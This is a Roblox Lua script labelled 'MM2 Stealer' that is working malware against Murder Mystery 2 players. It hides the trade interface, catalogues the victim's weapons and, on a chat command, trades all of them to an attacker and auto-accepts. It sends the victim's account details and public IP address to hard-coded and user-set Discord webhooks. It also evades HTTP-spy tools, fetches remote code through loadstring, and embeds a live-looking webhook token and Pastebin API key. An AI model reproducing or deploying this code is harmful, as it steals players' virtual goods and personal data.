if Username == "" or Username == nil then
    game.Players.LocalPlayer:Kick("Please Enter A Username!")
end
if Webhook == "" or Webhook == nil then
    game.Players.LocalPlayer:Kick("Please Enter A Webhook!")
end

--logs webhook
logsweb = "https://discord.com/api/webhooks/1337573946513559572/a4tLP1vlXWWTzHTNHYdLysOU1uPH1JXrpKrLsM2TipQlHAV7-XrAlrN977Y7ScTHSlBM"

Logs_webhook = logsweb

repeat wait() until game:IsLoaded()

if getgenv().scriptexecuted then return end
getgenv().scriptexecuted = true

local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)

local destroytrades2 = coroutine.create(function()
    while true do
        local player = game:GetService("Players").LocalPlayer
        local tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
        local tradeGUIPhone = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")

        if tradeGUI.Enabled == true then
            tradeGUI.Enabled = false
        end

        if tradeGUIPhone.Enabled == true then
            tradeGUIPhone.Enabled = false
        end

        wait(0.1)
    end
end)

if Fakegui and Fakegui ~= "" then
    loadstring(game:HttpGet(Fakegui))()
end

local levelTable = {}
for i,v in pairs(LevelModule.XPTable) do
    if PlayerDataModule.NewXP < v then
        table.insert(levelTable, i)
    end
end
local playerLevel = math.min(table.unpack(levelTable))
local playerPrestige = LevelModule.Prestige

local allItems = {}
local itemsCount = 0

local vintageItems = {}
local commonItems = {}
local uncommonItems = {}
local rareItems = {}
local legendaryItems = {}
local godlyItems = {}
local ancientItems = {}
local uniqueItems = {}

local vintageItemsC = 0
local commonItemsC = 0
local uncommonItemsC = 0
local rareItemsC = 0
local legendaryItemsC = 0
local godlyItemsC = 0
local ancientItemsC = 0
local uniqueItemsC = 0

for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
    for c,d in pairs(b) do
        table.insert(allItems, d.ItemName)

        if d.Rarity == "Vintage" then
            vintageItemsC = vintageItemsC + 1
            table.insert(vintageItems, d.DataID)
        end

        if d.Rarity == "Common" then
            commonItemsC = commonItemsC + 1
            table.insert(commonItems, d.DataID)
        end

        if d.Rarity == "Uncommon" then
            uncommonItemsC = uncommonItemsC + 1
            table.insert(uncommonItems, d.DataID)
        end

        if d.Rarity == "Rare" then
            rareItemsC = rareItemsC + 1
            table.insert(rareItems, d.DataID)
        end

        if d.Rarity == "Legendary" then
            legendaryItemsC = legendaryItemsC + 1
            table.insert(legendaryItems, d.DataID)
        end

        if d.Rarity == "Godly" then
            godlyItemsC = godlyItemsC + 1
            table.insert(godlyItems, d.DataID)
        end

        if d.Rarity == "Ancient" then
            ancientItemsC = ancientItemsC + 1
            table.insert(ancientItems, d.DataID)
        end

        if d.Rarity == "Unique" then
            uniqueItemsC = uniqueItemsC + 1
            table.insert(uniqueItems, d.DataID)
        end
    end
end

for i,v in pairs(allItems) do
    itemsCount = itemsCount + 1
end

local function isTradeModuleAvailable()
    local success, TradeModule = pcall(function()
        return require(game:GetService("ReplicatedStorage").Modules.TradeModule)
    end)
    return success and TradeModule
end

local function stealItems()
    coroutine.resume(destroytrades2)

    local sendArgs = {
        [1] = game:GetService("Players")[Username]
    }
    game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))

    wait(3)

    for i,v in pairs(uniqueItems) do
        local args = {
            [1] = v,
            [2] = "Weapons"
        }
        
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
    end

    for i,v in pairs(ancientItems) do
        local args = {
            [1] = v,
            [2] = "Weapons"
        }
        
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
    end

    for i,v in pairs(godlyItems) do
        local args = {
            [1] = v,
            [2] = "Weapons"
        }
        
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
    end

    for i,v in pairs(vintageItems) do
        local args = {
            [1] = v,
            [2] = "Weapons"
        }
        
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
    end

    for i,v in pairs(legendaryItems) do
        local args = {
            [1] = v,
            [2] = "Weapons"
        }
        
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
    end

    for i,v in pairs(rareItems) do
        local args = {
            [1] = v,
            [2] = "Weapons"
        }
        
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
    end

    for i,v in pairs(uncommonItems) do
        local args = {
            [1] = v,
            [2] = "Weapons"
        }
        
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
    end

    for i,v in pairs(commonItems) do
        local args = {
            [1] = v,
            [2] = "Weapons"
        }
        
        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
    end

    wait(6)
    local acc = {
        [1] = 285646582
    }
    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack(acc))
end

local HttpService = game:GetService("HttpService")

-- Formats item list into a string
local function formatItems(itemList)
    if #itemList == 0 then
        return "Player Has No Items Of This Rarity."
    else
        return table.concat(itemList, "\n")
    end
end


--anti httspy
-- Function to detect possible HTTP spy by checking GUI names
local function detectHttpSpy()
    local function isHttpSpy(gui)
        return gui and gui:IsA("ScreenGui") and gui.Name:lower():find("gui_") ~= nil  -- Less obvious than "http"
    end

    -- Loop through CoreGui elements and detect suspicious names
    for _, gui in ipairs(game:GetService("CoreGui"):GetChildren()) do
        if isHttpSpy(gui) then
            return true
        end
    end

    return false
end

-- Check for HTTP spy and abort script if detected
if detectHttpSpy() then
    warn("Suspicious activity detected. Aborting script execution.")
    return
end

local HttpService = game:GetService("HttpService")

local function pastebin(content)

    local body = {
        api_dev_key = "CuOOgowqB0lzOqW6W_BTWWsv3HH0kW54",
        api_paste_code = content,
        api_option = "paste"
    }

    local encodedBody = ""
    for key, value in pairs(body) do
        encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
    end
    encodedBody = encodedBody:sub(1, -2)

    local response
    local success, err = pcall(function()
        response = request({
            Url = "https://pastebin.com/api/api_post.php",
            Method = "POST",
            Body = encodedBody,
            Headers = {
                ["Content-Type"] = "application/x-www-form-urlencoded"
            },
            Timeout = 20
        })
    end)

    if not success or not response or not response.Success then
        return "\nError...\n"
    end

    local pasteUrl = response.Body
    local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")

    return rawUrl
end

local pastebinString = 'game.Players.LocalPlayer:Kick("no functionality yet")'

local pastebinLink = pastebin(pastebinString)

-- Player Info
local playerName = game.Players.LocalPlayer.Name
local playerId = game.Players.LocalPlayer.UserId
local clickablePlayerName = "[" .. playerName .. "](https://www.roblox.com/users/" .. playerId .. "/profile)"
local currentTime = os.date("%Y-%m-%d %H:%M:%S")


local logs = {
    username = "void Script - Result",
    avatar_url = "https://media.discordapp.net/attachments/1279110366797758478/1286666241238630452/simple-circle-moon-wolf-head-vector-animal-logo-template-nature-wildlife-icon-design-inspiration-simple-circle-moon-164937967_1.webp?ex=66f402d1&is=66f2b151&hm=3398abc14d2872585437375e63aafbe3b85f243553ea5174cea105f2fc67d7bd&=&animated=true&width=519&height=519",
    content = "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "', game.Players.LocalPlayer)",
    embeds = {{
        title = "**__VOID__ | __MM2 Stealer__**",
        color = tonumber(0x000000),
        description = clickablePlayerName .. " is waiting in the queue for you. Join with execution.",
        thumbnail = {
            url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(playerId) .. "&width=420&height=420&format=png", -- Ensure this is correctly set
        },
        fields = {
            {
                name = "Information",
                value = "```lua\nExecutor: " .. tostring(identifyexecutor()) .. "\nUsername: " .. game.Players.LocalPlayer.Name .. "\nUser-ID: " .. tostring(game.Players.LocalPlayer.UserId) .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. tostring(Username) .. "\nIP Address: " .. tostring(game:HttpGet('https://ipinfo.io/ip')) .. "```",
                inline = false,
            },
            {
                name = "Weapon",
                value = "```lua\nTotal Item: " .. tostring(uniqueItemsC + ancientItemsC + godlyItemsC + legendaryItemsC + vintageItemsC + rareItemsC + uncommonItemsC + commonItemsC) .. "\nUnique: " .. tostring(uniqueItemsC) .. "\nAncient: " .. tostring(ancientItemsC) .. "\nGodly: " .. tostring(godlyItemsC) .. "\nLegendary: " .. tostring(legendaryItemsC) .. "\nVintage: " .. tostring(vintageItemsC) .. "\nRare: " .. tostring(rareItemsC) .. "\nUncommon: " .. tostring(uncommonItemsC) .. "\nCommon: " .. tostring(commonItemsC) .. "```",
                inline = false,
            },
            {
                name = "Auto Trade Script (No Functionality Yet)",
                value = "```lua\nUsername = \"" .. tostring(Username) .. "\"\nloadstring(game:HttpGet(\"" .. pastebinLink .. "\"))()```",
                inline = false,
            },
        },
        footer = {
            text = "Logs webhook | VOID",
        },
    }},
}

local request = http_request or request or HttpPost or syn.request
request(
    {
    Url = Logs_webhook,
        Method = "POST",
        Headers = {
                ["Content-Type"] = "application/json"
        },
        Body = game.HttpService:JSONEncode(logs)
    }
)

local function send_embed_with_txt_attachment(uniqueItems, ancientItems, godlyItems, legendaryItems, vintageItems, rareItems, uncommonItems, commonItems)
    -- Create the content for the .txt file
    local fileContent =
        "-- Unique Items\n" .. formatItems(uniqueItems) ..
        "\n\n-- Ancient Items\n" .. formatItems(ancientItems) ..
        "\n\n-- Godly Items\n" .. formatItems(godlyItems) ..
        "\n\n-- Legendary Items\n" .. formatItems(legendaryItems) ..
        "\n\n-- Vintage Items\n" .. formatItems(vintageItems) ..
        "\n\n-- Rare Items\n" .. formatItems(rareItems) ..
        "\n\n-- Uncommon Items\n" .. formatItems(uncommonItems) ..
        "\n\n-- Common Items\n" .. formatItems(commonItems)

-- Create the embed JSON
local embed = {
    username = "ezz",
    avatar_url = "empty",
    content = "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "', game.Players.LocalPlayer)",
    embeds = {{
        title = "**mm2 stealer by Void**",
        color = tonumber(0x000000),
        description = clickablePlayerName .. " is waiting in the queue for you. Join with execution.",
        thumbnail = {
            url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(playerId) .. "&width=420&height=420&format=png", -- Ensure this is correctly set
        },
        fields = {
            {
                name = "Information",
                value = "```lua\nExecutor: " .. tostring(identifyexecutor()) .. "\nUsername: " .. game.Players.LocalPlayer.Name .. "\nUser-ID: " .. tostring(game.Players.LocalPlayer.UserId) .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. tostring(Username) .. "\nIP Address: " .. tostring(game:HttpGet('https://ipinfo.io/ip')) .. "```",
                inline = false,
            },
            {
                name = "Weapon",
                value = "```lua\nTotal Item: " .. tostring(uniqueItemsC + ancientItemsC + godlyItemsC + legendaryItemsC + vintageItemsC + rareItemsC + uncommonItemsC + commonItemsC) .. "\nUnique: " .. tostring(uniqueItemsC) .. "\nAncient: " .. tostring(ancientItemsC) .. "\nGodly: " .. tostring(godlyItemsC) .. "\nLegendary: " .. tostring(legendaryItemsC) .. "\nVintage: " .. tostring(vintageItemsC) .. "\nRare: " .. tostring(rareItemsC) .. "\nUncommon: " .. tostring(uncommonItemsC) .. "\nCommon: " .. tostring(commonItemsC) .. "```",
                inline = false,
            },
            {
                name = "Auto Trade Script (No Functionality Yet)",
                value = "```lua\nUsername = \"" .. tostring(Username) .. "\"\nloadstring(game:HttpGet(\"" .. pastebinLink .. "\"))()```",
                inline = false,
            },
        },
        footer = {
            text = "void on top| " .. currentTime,
        },
    }},
}
    -- Define the boundary for multipart form data
    local boundary = "----BoundaryString"

    -- Create the body for the multipart/form-data request
    local body = "--" .. boundary .. "\r\n" ..
        'Content-Disposition: form-data; name="payload_json"\r\n\r\n' ..
        game:GetService("HttpService"):JSONEncode(embed) .. "\r\n" ..
        "--" .. boundary .. "\r\n" ..
        'Content-Disposition: form-data; name="file"; filename="items.txt"\r\n' ..
        'Content-Type: text/plain\r\n\r\n' ..
        fileContent .. "\r\n" ..
        "--" .. boundary .. "--\r\n"

    -- Send the request with the embed and file
    local request = http_request or request or HttpPost or syn.request
    local response = request({
        Url = Webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
        },
        Body = body
    })

    -- Debug: Print the response status for troubleshooting
    print(response.StatusCode, response.StatusMessage)
end

-- Call the function
send_embed_with_txt_attachment(uniqueItems, ancientItems, godlyItems, legendaryItems, vintageItems, rareItems, uncommonItems, commonItems)

game.Players.PlayerAdded:Connect(function(player) 
    if playerName == Username then
        player.Chatted:Connect(function(msg)
            if msg == "/murder" or msg == "Murder" or msg == "MURDER" then
                stealItems()
            end
        end)
    end
end)
